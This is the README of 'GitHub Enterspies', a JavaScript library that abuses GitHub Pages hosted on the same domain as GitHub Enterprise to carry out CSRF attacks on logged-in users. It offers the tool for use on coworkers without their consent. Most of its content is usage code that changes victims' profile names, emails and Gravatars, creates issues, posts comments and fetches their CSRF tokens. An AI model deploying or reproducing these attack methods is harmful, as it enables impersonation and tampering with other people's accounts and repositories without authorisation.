# GitHub Enterspies

GitHub Enterspies provides a JavaScript API for hijacking the accounts of [GitHub Enterprise](https://enterprise.github.com/) users.

## What

GHE installations host [GitHub Pages](https://pages.github.com/) on the same domain as the primary GitHub application. This makes CSRF attacks possible. If your place of employment uses GitHub Enterprise, this library will let you post comments, open issues, modify repos and change the profile info of your coworkers without their knowledge or consent.

## Installation

Include `dist/ghe.js` in an HTML page hosted on the `gh-pages` branch of a GHE repo. See the `examples` directory for examples.

## Usage

The API mimics that of [GitHub.js](https://github.com/michael/github) but no authentication is required. All methods return promises.

### User profile methods

Change the name that is listed on the user's profile page.

```
GHE.user.setName('Brian Carroll');
```

Change the user's public email address.

```
GHE.user.setEmail('sup@whatevs.com');
```

Change the user's location.

```
GHE.user.setLocation('Baltimore');
```

Change the user's website.

```
GHE.user.setWebsite('http://whatevs.com');
```

Change the user's Gravatar email. This will change their profile photo.

```
GHE.user.setGravatar('someothergravataremailaddress@whatevs.com');
```

### Repository methods

Create a new GitHub issue at the specified repository. Provide a title for the issue and some markdown.

```
GHE.repo('contolini/awesome-repo').createIssue({
  title: 'CSRF party',
  body: 'Creating issues without permission sure is **fun**!'
});
```

Post a new comment to a repo's specified issue. Provide the issue's number and some markdown.

```
GHE.repo('contolini/awesome-repo').postComment({
  issueNum: 28,
  body: 'I would just like to say that this issue is da best.'
});
```

*More to come!*

### Misc. methods

If you just want their CSRF token.

```
GHE.fetchToken();
```

## Contributing

`npm install` to install dependencies. Bundle with `npm run browser`.

## License

The project is in the public domain within the United States, and
copyright and related rights in the work worldwide are waived through
the [CC0 1.0 Universal public domain dedication](http://creativecommons.org/publicdomain/zero/1.0/).

All contributions to this project will be released under the CC0
dedication. By submitting a pull request, you are agreeing to comply
with this waiver of copyright interest.

## Release History

 * 2014-12-11   [0.1.0](../../tree/0.1.0)   Initial release.
